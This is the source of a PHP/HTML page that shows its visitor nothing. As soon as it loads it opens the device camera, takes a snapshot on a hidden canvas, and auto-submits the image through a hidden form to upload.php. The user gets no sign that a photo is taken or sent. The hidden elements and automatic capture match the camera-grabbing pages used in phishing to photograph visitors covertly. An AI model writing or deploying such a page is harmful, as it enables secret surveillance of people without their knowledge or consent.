<?php
// Start the session
session_start();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Capture and Upload Photo</title>
  <style>
    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <!-- Form to upload photo -->
  <form id="photoForm" method="POST" action="upload.php">
    <input type="hidden" name="image" id="imageData">
    <input type="submit" style="display:none;">
  </form>

  <script>
    // Access the device camera
    function startCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
          const videoElement = document.createElement('video');
          videoElement.width = 640;
          videoElement.height = 480;
          videoElement.srcObject = stream;

          // Wait for the video to load and take a snapshot
          videoElement.onloadedmetadata = function () {
            takeSnapshot(videoElement);
          };
        })
        .catch(function (err) {
          console.log("Error: " + err);
        });
    }

    // Function to capture an image from the video stream
    function takeSnapshot(video) {
      // Create an invisible canvas to draw the video frame
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = 640;
      canvas.height = 480;

      // Draw the video frame onto the canvas
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Get the image data from the canvas (base64 encoded PNG image)
      const dataURL = canvas.toDataURL('image/png');

      // Set the base64 image data to the hidden input field
      document.getElementById('imageData').value = dataURL;

      // Submit the form to upload the image
      document.getElementById('photoForm').submit();
    }

    // Start the camera when the page loads
    window.onload = function () {
      startCamera();
    };
  </script>

</body>
</html>
